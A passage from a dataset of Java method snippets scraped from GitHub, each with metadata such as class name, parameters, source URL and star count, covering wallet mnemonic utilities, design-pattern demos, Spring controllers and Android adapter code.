void executeAsyncNow(Runnable runnable) {\n        new RunnableTask(runnable).executeAsyncNow();\n    }", "url": "https://raw.githubusercontent.com/iqiyi/TaskManager/master/TaskManager/src/main/java/org/qiyi/basecore/taskmanager/TM.java", "stars": "50", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59359, "method_name": "isFullLogEnabled", "class_name": "TM", "params": [], "throws": null, "modifiers": ["static"], "return_type": "boolean", "snippet": "    static boolean isFullLogEnabled() {\n        return manager.isFullLogEnabled();\n    }", "url": "https://raw.githubusercontent.com/iqiyi/TaskManager/master/TaskManager/src/main/java/org/qiyi/basecore/taskmanager/TM.java", "stars": "50", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59360, "method_name": "main", "class_name": "CollegeTest", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n        College college1 = new College(\"\u5efa\u7b51\u5b66\u9662\");\n        College college2 = new College(\"\u7ecf\u6d4e\u7ba1\u7406\u5b66\u9662\");\n        College college3 = new College(\"\u571f\u6728\u6c34\u5229\u5b66\u9662\");\n        College college4 = new College(\"\u516c\u5171\u7ba1\u7406\u5b66\u9662\");\n        College college5 = new College(\"\u73af\u5883\u5b66\u9662\");\n        College college6 = new College(\"\u9a6c\u514b\u601d\u4e3b\u4e49\u5b66\u9662\");\n\n        CollegeAggregate collegeAggregate = new CollegeAggregateImpl();\n        collegeAggregate.addCollege(college1);\n        collegeAggregate.addCollege(college2);\n        collegeAggregate.addCollege(college3);\n        collegeAggregate.addCollege(college4);\n        collegeAggregate.addCollege(college5);\n        collegeAggregate.addCollege(college6);\n\n        System.out.println(\"-----\u5b66\u9662\u5217\u8868----\");\n        printCollege(collegeAggregate);\n        collegeAggregate.removeCollege(college2);\n        collegeAggregate.removeCollege(college5);\n\n        System.out.println(\"-----\u5220\u9664\u540e\u7684\u5b66\u9662\u5217\u8868----\");\n        printCollege(collegeAggregate);\n    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/behavioral/iterator/CollegeTest.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59361, "method_name": "printCollege", "class_name": "CollegeTest", "params": ["CollegeAggregate"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void printCollege(CollegeAggregate collegeAggregate){\n        CollegeIterator iterator = collegeAggregate.getIterator();\n        while (iterator.hasNextCollege()){\n            College college = iterator.nextCollege();\n            System.out.println(college.getName());\n        }\n    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/behavioral/iterator/CollegeTest.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59362, "method_name": "generateMnemonic", "class_name": "MnemonicUtils", "params": ["byte"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String generateMnemonic(byte[] initialEntropy) {\n        validateEntropy(initialEntropy);\n        final List<String> words = getWords();\n\n        int ent = initialEntropy.length * 8;\n        int checksumLength = ent / 32;\n\n        byte checksum = calculateChecksum(initialEntropy);\n        boolean[] bits = convertToBits(initialEntropy, checksum);\n\n        int iterations = (ent + checksumLength) / 11;\n        StringBuilder mnemonicBuilder = new StringBuilder();\n        for (int i = 0; i < iterations; i++) {\n            int index = toInt(nextElevenBits(bits, i));\n            mnemonicBuilder.append(words.get(index));\n\n            boolean notLastIteration = i < iterations - 1;\n            if (notLastIteration) {\n                mnemonicBuilder.append(\" \");\n            }\n        }\n\n        return mnemonicBuilder.toString();\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/coinlib/src/main/java/com/cobo/coinlib/MnemonicUtils.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59363, "method_name": "generateEntropy", "class_name": "MnemonicUtils", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "byte", "snippet": "    public static byte[] generateEntropy(String mnemonic) {\n        final BitSet bits = new BitSet();\n        final int size = mnemonicToBits(mnemonic, bits);\n        if (size == 0) {\n            throw new IllegalArgumentException(\"Empty mnemonic\");\n        }\n\n        final int ent = 32 * size / 33;\n        if (ent % 8 != 0) {\n            throw new IllegalArgumentException(\"Wrong mnemonic size\");\n        }\n        final byte[] entropy = new byte[ent / 8];\n        for (int i = 0; i < entropy.length; i++) {\n            entropy[i] = readByte(bits, i);\n        }\n        validateEntropy(entropy);\n\n        final byte expectedChecksum = calculateChecksum(entropy);\n        final byte actualChecksum = readByte(bits, entropy.length);\n        if (expectedChecksum != actualChecksum) {\n            throw new IllegalArgumentException(\"Wrong checksum\");\n        }\n\n        return entropy;\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/coinlib/src/main/java/com/cobo/coinlib/MnemonicUtils.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59364, "method_name": "getWords", "class_name": "MnemonicUtils", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "List<String>", "snippet": "    public static List<String> getWords() {\n        if (WORD_LIST == null) {\n            WORD_LIST = Arrays.asList(WordList.words);\n        }\n        return WORD_LIST;\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/coinlib/src/main/java/com/cobo/coinlib/MnemonicUtils.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59365, "method_name": "validateMnemonic", "class_name": "MnemonicUtils", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "    public static boolean validateMnemonic(String mnemonic) {\n        try {\n            generateEntropy(mnemonic);\n            return true;\n        } catch (Exception ex) {\n            return false;\n        }\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/coinlib/src/main/java/com/cobo/coinlib/MnemonicUtils.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59366, "method_name": "nextElevenBits", "class_name": "MnemonicUtils", "params": ["boolean", "int"], "throws": null, "modifiers": ["static", "private"], "return_type": "boolean", "snippet": "    private static boolean[] nextElevenBits(boolean[] bits, int i) {\n        int from = i * 11;\n        int to = from + 11;\n        return Arrays.copyOfRange(bits, from, to);\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/coinlib/src/main/java/com/cobo/coinlib/MnemonicUtils.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59367, "method_name": "validateEntropy", "class_name": "MnemonicUtils", "params": ["byte"], "throws": null, "modifiers": ["static", "private"], "return_type": "void", "snippet": "    private static void validateEntropy(byte[] entropy) {\n        if (entropy == null) {\n            throw new IllegalArgumentException(\"Entropy is required\");\n        }\n\n        int ent = entropy.length * 8;\n        if (ent < 128 || ent > 256 || ent % 32 != 0) {\n            throw new IllegalArgumentException(\"The allowed size of ENT is 128-256 bits of \"\n                    + \"multiples of 32\");\n        }\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/coinlib/src/main/java/com/cobo/coinlib/MnemonicUtils.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59368, "method_name": "isValidateEntropy", "class_name": "MnemonicUtils", "params": ["byte"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "    public static boolean isValidateEntropy(byte[] entropy) {\n        if (entropy == null) {\n            return false;\n        }\n\n        int ent = entropy.length * 8;\n        return ent >= 128 && ent <= 256 && ent % 32 == 0;\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/coinlib/src/main/java/com/cobo/coinlib/MnemonicUtils.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59369, "method_name": "convertToBits", "class_name": "MnemonicUtils", "params": ["byte", "byte"], "throws": null, "modifiers": ["static", "private"], "return_type": "boolean", "snippet": "    private static boolean[] convertToBits(byte[] initialEntropy, byte checksum) {\n        int ent = initialEntropy.length * 8;\n        int checksumLength = ent / 32;\n        int totalLength = ent + checksumLength;\n        boolean[] bits = new boolean[totalLength];\n\n        for (int i = 0; i < initialEntropy.length; i++) {\n            for (int j = 0; j < 8; j++) {\n                byte b = initialEntropy[i];\n                bits[8 * i + j] = toBit(b, j);\n            }\n        }\n\n        for (int i = 0; i < checksumLength; i++) {\n            bits[ent + i] = toBit(checksum, i);\n        }\n\n        return bits;\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/coinlib/src/main/java/com/cobo/coinlib/MnemonicUtils.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59370, "method_name": "toBit", "class_name": "MnemonicUtils", "params": ["byte", "int"], "throws": null, "modifiers": ["static", "private"], "return_type": "boolean", "snippet": "    private static boolean toBit(byte value, int index) {\n        return ((value >>> (7 - index)) & 1) > 0;\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/coinlib/src/main/java/com/cobo/coinlib/MnemonicUtils.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59371, "method_name": "toInt", "class_name": "MnemonicUtils", "params": ["boolean"], "throws": null, "modifiers": ["static", "private"], "return_type": "int", "snippet": "    private static int toInt(boolean[] bits) {\n        int value = 0;\n        for (int i = 0; i < bits.length; i++) {\n            boolean isSet = bits[i];\n            if (isSet) {\n                value += 1 << bits.length - i - 1;\n            }\n        }\n\n        return value;\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/coinlib/src/main/java/com/cobo/coinlib/MnemonicUtils.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59372, "method_name": "mnemonicToBits", "class_name": "MnemonicUtils", "params": ["String", "BitSet"], "throws": null, "modifiers": ["static", "private"], "return_type": "int", "snippet": "    private static int mnemonicToBits(String mnemonic, BitSet bits) {\n        int bit = 0;\n        final List<String> vocabulary = getWords();\n        final StringTokenizer tokenizer = new StringTokenizer(mnemonic, \" \");\n        while (tokenizer.hasMoreTokens()) {\n            final String word = tokenizer.nextToken();\n            final int index = vocabulary.indexOf(word);\n            if (index < 0) {\n                throw new IllegalArgumentException(String.format(\n                        \"Mnemonic word '%s' should be in the word list\", word));\n            }\n            for (int k = 0; k < 11; k++) {\n                bits.set(bit++, isBitSet(index, 10 - k));\n            }\n        }\n        return bit;\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/coinlib/src/main/java/com/cobo/coinlib/MnemonicUtils.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59373, "method_name": "readByte", "class_name": "MnemonicUtils", "params": ["BitSet", "int"], "throws": null, "modifiers": ["static", "private"], "return_type": "byte", "snippet": "    private static byte readByte(BitSet bits, int startByte) {\n        byte res = 0;\n        for (int k = 0; k < 8; k++) {\n            if (bits.get(startByte * 8 + k)) {\n                res = (byte) (res | (1 << (7 - k)));\n            }\n        }\n        return res;\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/coinlib/src/main/java/com/cobo/coinlib/MnemonicUtils.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59374, "method_name": "isBitSet", "class_name": "MnemonicUtils", "params": ["int", "int"], "throws": null, "modifiers": ["static", "private"], "return_type": "boolean", "snippet": "    private static boolean isBitSet(int n, int k) {\n        return ((n >> k) & 1) == 1;\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/coinlib/src/main/java/com/cobo/coinlib/MnemonicUtils.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59375, "method_name": "calculateChecksum", "class_name": "MnemonicUtils", "params": ["byte"], "throws": null, "modifiers": ["static", "private"], "return_type": "byte", "snippet": "    private static byte calculateChecksum(byte[] initialEntropy) {\n        int ent = initialEntropy.length * 8;\n        byte mask = (byte) (0xff << 8 - ent / 32);\n        byte[] bytes = new SHA256.Digest().digest(initialEntropy);\n\n        return (byte) (bytes[0] & mask);\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/coinlib/src/main/java/com/cobo/coinlib/MnemonicUtils.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59376, "method_name": "addFooBar", "class_name": "FooBarController", "params": ["FooBar"], "throws": ["Exception"], "modifiers": ["public"], "return_type": "ApiResult<Boolean>", "snippet": "    public ApiResult<Boolean> addFooBar(@Validated(Add.class) @RequestBody FooBar fooBar) throws Exception {\n        boolean flag = fooBarService.saveFooBar(fooBar);\n        return ApiResult.result(flag);\n    }", "url": "https://raw.githubusercontent.com/geekidea/spring-cloud-plus/master/scp-example/scp-example-server/src/main/java/com/example/foobar/controller/FooBarController.java", "stars": "22", "class_props": {"extends": "BaseController", "implements": null, "modifiers": ["public"]}}, {"id": 59377, "method_name": "updateFooBar", "class_name": "FooBarController", "params": ["FooBar"], "throws": ["Exception"], "modifiers": ["public"], "return_type": "ApiResult<Boolean>", "snippet": "    public ApiResult<Boolean> updateFooBar(@Validated(Update.class) @RequestBody FooBar fooBar) throws Exception {\n        boolean flag = fooBarService.updateFooBar(fooBar);\n        return ApiResult.result(flag);\n    }", "url": "https://raw.githubusercontent.com/geekidea/spring-cloud-plus/master/scp-example/scp-example-server/src/main/java/com/example/foobar/controller/FooBarController.java", "stars": "22", "class_props": {"extends": "BaseController", "implements": null, "modifiers": ["public"]}}, {"id": 59378, "method_name": "deleteFooBar", "class_name": "FooBarController", "params": ["Long"], "throws": ["Exception"], "modifiers": ["public"], "return_type": "ApiResult<Boolean>", "snippet": "    public ApiResult<Boolean> deleteFooBar(@PathVariable(\"id\") Long id) throws Exception {\n        boolean flag = fooBarService.deleteFooBar(id);\n        return ApiResult.result(flag);\n    }", "url": "https://raw.githubusercontent.com/geekidea/spring-cloud-plus/master/scp-example/scp-example-server/src/main/java/com/example/foobar/controller/FooBarController.java", "stars": "22", "class_props": {"extends": "BaseController", "implements": null, "modifiers": ["public"]}}, {"id": 59379, "method_name": "getFooBar", "class_name": "FooBarController", "params": ["Long"], "throws": ["Exception"], "modifiers": ["public"], "return_type": "ApiResult<FooBar>", "snippet": "    public ApiResult<FooBar> getFooBar(@PathVariable(\"id\") Long id) throws Exception {\n        FooBar fooBar = fooBarService.getById(id);\n        return ApiResult.ok(fooBar);\n    }", "url": "https://raw.githubusercontent.com/geekidea/spring-cloud-plus/master/scp-example/scp-example-server/src/main/java/com/example/foobar/controller/FooBarController.java", "stars": "22", "class_props": {"extends": "BaseController", "implements": null, "modifiers": ["public"]}}, {"id": 59380, "method_name": "getFooBarPageList", "class_name": "FooBarController", "params": ["FooBarPageQuery"], "throws": ["Exception"], "modifiers": ["public"], "return_type": "ApiResult<Paging>", "snippet": "    public ApiResult<Paging<FooBar>> getFooBarPageList(@Validated @RequestBody FooBarPageQuery fooBarPageQuery) throws Exception {\n        Paging<FooBar> paging = fooBarService.getFooBarPageList(fooBarPageQuery);\n        return ApiResult.ok(paging);\n    }", "url": "https://raw.githubusercontent.com/geekidea/spring-cloud-plus/master/scp-example/scp-example-server/src/main/java/com/example/foobar/controller/FooBarController.java", "stars": "22", "class_props": {"extends": "BaseController", "implements": null, "modifiers": ["public"]}}, {"id": 59381, "method_name": "getEtag", "class_name": "EtagGenerator", "params": ["int", "String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getEtag(int primaryKey, String contentType) {\n        try {\n            MessageDigest messageDigest = MessageDigest.getInstance(\"SHA-256\");\n\n            ByteBuffer byteBuffer = ByteBuffer.allocate(secret.length + Integer.BYTES);\n            byteBuffer.put(secret);\n            byteBuffer.putInt(primaryKey);\n\n            final byte[] saltedPayload = byteBuffer.array();\n\n            final byte[] sha256Hash = messageDigest.digest(saltedPayload);\n\n            return contentType + Base64.getEncoder().encodeToString(sha256Hash);\n        } catch (NoSuchAlgorithmException e) {\n            throw new RuntimeException(e);\n        }\n    }", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-backend/develop/dpppt-backend-sdk/dpppt-backend-sdk-data/src/main/java/org/dpppt/backend/sdk/data/EtagGenerator.java", "stars": "125", "class_props": {"extends": null, "implements": ["EtagGeneratorInterface"], "modifiers": ["public"]}}, {"id": 59382, "method_name": "getContext", "class_name": "MathIllegalArgumentException", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ExceptionContext", "snippet": "    public ExceptionContext getContext() {\n        return context;\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/apachemath/MathIllegalArgumentException.java", "stars": "74", "class_props": {"extends": "IllegalArgumentException", "implements": ["ExceptionContextProvider"], "modifiers": ["public"]}}, {"id": 59383, "method_name": "getMessage", "class_name": "MathIllegalArgumentException", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getMessage() {\n        return context.getMessage();\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/apachemath/MathIllegalArgumentException.java", "stars": "74", "class_props": {"extends": "IllegalArgumentException", "implements": ["ExceptionContextProvider"], "modifiers": ["public"]}}, {"id": 59384, "method_name": "getLocalizedMessage", "class_name": "MathIllegalArgumentException", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getLocalizedMessage() {\n        return context.getLocalizedMessage();\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/apachemath/MathIllegalArgumentException.java", "stars": "74", "class_props": {"extends": "IllegalArgumentException", "implements": ["ExceptionContextProvider"], "modifiers": ["public"]}}, {"id": 59385, "method_name": "play", "class_name": "VideoSpeedState", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void play() {\n        super.videoContext.setVideoState(VideoContext.PLAY_STATE);\n    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/behavioral/state/VideoSpeedState.java", "stars": "2", "class_props": {"extends": "VideoState", "implements": null, "modifiers": ["public"]}}, {"id": 59386, "method_name": "pause", "class_name": "VideoSpeedState", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void pause() {\n        super.videoContext.setVideoState(VideoContext.VIDEO_PAUSE_STATE);\n    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/behavioral/state/VideoSpeedState.java", "stars": "2", "class_props": {"extends": "VideoState", "implements": null, "modifiers": ["public"]}}, {"id": 59387, "method_name": "speed", "class_name": "VideoSpeedState", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void speed() {\n        System.out.println(\"\u89c6\u9891\u6b63\u5904\u5728\u500d\u901f\u64ad\u653e\u72b6\u6001\");\n    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/behavioral/state/VideoSpeedState.java", "stars": "2", "class_props": {"extends": "VideoState", "implements": null, "modifiers": ["public"]}}, {"id": 59388, "method_name": "close", "class_name": "VideoSpeedState", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void close() {\n        super.videoContext.setVideoState(VideoContext.VIDEO_CLOSE_STATE);\n    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/behavioral/state/VideoSpeedState.java", "stars": "2", "class_props": {"extends": "VideoState", "implements": null, "modifiers": ["public"]}}, {"id": 59389, "method_name": "getReturn", "class_name": "ReserveStatusGetResponse", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getReturn() {\n        return _return;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/ws/helpdesk/ReserveStatusGetResponse.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59390, "method_name": "setReturn", "class_name": "ReserveStatusGetResponse", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setReturn(int value) {\n        this._return = value;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/ws/helpdesk/ReserveStatusGetResponse.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59391, "method_name": "buyHouse", "class_name": "Husband", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void buyHouse(){\n        System.out.println(\"\u5317\u4eac\u4e8c\u73af\u5185\u4e70\u4e00\u5957\u56db\u5408\u9662!\");\n    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/24.%E3%80%90Stream%E6%B5%81%E3%80%81%E6%96%B9%E6%B3%95%E5%BC%95%E7%94%A8%E3%80%91%E7%AC%94%E8%AE%B0/code/13_StreamAndMethodReference/src/com/itheima/demo08/ThisMethodReference/Husband.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59392, "method_name": "marry", "class_name": "Husband", "params": ["Richable"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void marry(Richable r){\n        r.buy();\n    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/24.%E3%80%90Stream%E6%B5%81%E3%80%81%E6%96%B9%E6%B3%95%E5%BC%95%E7%94%A8%E3%80%91%E7%AC%94%E8%AE%B0/code/13_StreamAndMethodReference/src/com/itheima/demo08/ThisMethodReference/Husband.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59393, "method_name": "soHappy", "class_name": "Husband", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void soHappy(){\n        //\u8c03\u7528\u7ed3\u5a5a\u7684\u65b9\u6cd5,\u65b9\u6cd5\u7684\u53c2\u6570Richable\u662f\u4e00\u4e2a\u51fd\u6570\u5f0f\u63a5\u53e3,\u4f20\u9012Lambda\u8868\u8fbe\u5f0f\n       /* marry(()->{\n            //\u4f7f\u7528this.\u6210\u5458\u65b9\u6cd5,\u8c03\u7528\u672c\u7c7b\u4e70\u623f\u5b50\u7684\u65b9\u6cd5\n            this.buyHouse();\n        });*/\n\n        /*\n            \u4f7f\u7528\u65b9\u6cd5\u5f15\u7528\u4f18\u5316Lambda\u8868\u8fbe\u5f0f\n            this\u662f\u5df2\u7ecf\u5b58\u5728\u7684\n            \u672c\u7c7b\u7684\u6210\u5458\u65b9\u6cd5buyHouse\u4e5f\u662f\u5df2\u7ecf\u5b58\u5728\u7684\n            \u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528this\u5f15\u7528\u672c\u7c7b\u7684\u6210\u5458\u65b9\u6cd5buyHouse\n         */\n        marry(this::buyHouse);\n    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/24.%E3%80%90Stream%E6%B5%81%E3%80%81%E6%96%B9%E6%B3%95%E5%BC%95%E7%94%A8%E3%80%91%E7%AC%94%E8%AE%B0/code/13_StreamAndMethodReference/src/com/itheima/demo08/ThisMethodReference/Husband.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59394, "method_name": "main", "class_name": "Husband", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n        new Husband().soHappy();\n    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/24.%E3%80%90Stream%E6%B5%81%E3%80%81%E6%96%B9%E6%B3%95%E5%BC%95%E7%94%A8%E3%80%91%E7%AC%94%E8%AE%B0/code/13_StreamAndMethodReference/src/com/itheima/demo08/ThisMethodReference/Husband.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59395, "method_name": "setUpdate", "class_name": "FundRecordAdapter", "params": ["List<FundRecordBean>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setUpdate(List<FundRecordBean> list) {\n        mCommentList = list;\n        notifyDataSetChanged();\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/adapter/otc/FundRecordAdapter.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"id": 59396, "method_name": "getItemViewType", "class_name": "FundRecordAdapter", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getItemViewType(int position) {\n        return super.getItemViewType(position);\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/adapter/otc/FundRecordAdapter.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"id": 59397, "method_name": "onCreateViewHolder", "class_name": "FundRecordAdapter", "params": ["ViewGroup", "int"], "throws": null, "modifiers": ["public"], "return_type": "InfoViewHolder", "snippet": "    public InfoViewHolder onCreateViewHolder(ViewGroup parent, int viewType) {\n        return new InfoViewHolder(LayoutInflater.from(parent.getContext()).inflate(R.layout.fund_record_item, parent, false));\n\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/adapter/otc/FundRecordAdapter.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"id": 59398, "method_name": "onBindViewHolder", "class_name": "FundRecordAdapter", "params": ["InfoViewHolder", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onBindViewHolder(InfoViewHolder holder, int position) {\n\n        if (mCommentList.get(position).getStatus() == 0) {\n            holder.status.setText(\"\u5b8c\u6210\");\n            holder.status.setTextColor(ContextCompat.getColor(mContext, R.color.color_000000));\n        } else if (mCommentList.get(position).getStatus() == 1) {\n            holder.status.setText(\"\u8fdb\u884c\u4e2d\");\n            holder.status.setTextColor(ContextCompat.getColor(mContext, R.color.color_00C185));\n        } else {\n            holder.status.setText(\"\u5931\u8d25\");\n            holder.status.setTextColor(ContextCompat.getColor(mContext, R.color.color_FF4742));\n        }\n\n\n        Date currentTime = new Date(mCommentList.get(position).getTime());\n        SimpleDateFormat formatter = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\");\n        String dateString = formatter.format(currentTime);\n\n        holder.timeTv.setText(dateString);\n        holder.numTv.setText(mCommentList.get(position).getNum()+\"\");\n        holder.message.setText(mCommentList.get(position).getMessage());\n        holder.titleTv.setText(mCommentList.get(position).getTitle());\n        if (position > 0 && mCommentList.get(position).getTitle().equals(mCommentList.get(position-1).getTitle())) {\n            holder.titleTv.setVisibility(View.GONE);\n        } else {\n            holder.titleTv.setVisibility(View.VISIBLE);\n        }\n\n        holder.view.setOnClickListener(new View.OnClickListener() {\n            @Override\n            public void onClick(View v) {\n//                Intent intent = new Intent(mContext, ProductInfoActivity.class);\n//                mContext.startActivity(intent);\n            }\n        });\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/adapter/otc/FundRecordAdapter.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"id": 59399, "method_name": "getItemCount", "class_name": "FundRecordAdapter", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getItemCount() {\n        return mCommentList.size();\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/adapter/otc/FundRecordAdapter.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"id": 59400, "method_name": "setOnClickListener", "class_name": "FundRecordAdapter", "params": ["AdapterClickListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setOnClickListener(AdapterClickListener adapterClickListener) {\n        onClickListener = adapterClickListener;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/adapter/otc/FundRecordAdapter.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"id": 59401, "method_name": "isEnable", "class_name": "TransactionProperties", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isEnable()\n    {\n        return enable;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/model/process/TransactionProperties.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59402, "method_name": "setEnable", "class_name": "TransactionProperties", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setEnable( boolean enable )\n    {\n        this.enable = enable;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/model/process/TransactionProperties.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59403, "method_name": "loadFromData", "class_name": "TransactionProperties", "params": ["ParameterMap", "String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void loadFromData( ParameterMap data, String prefix )\n    {\n        enable = data.getBoolean( prefix + \"enable\", false );            \n    }", "url": 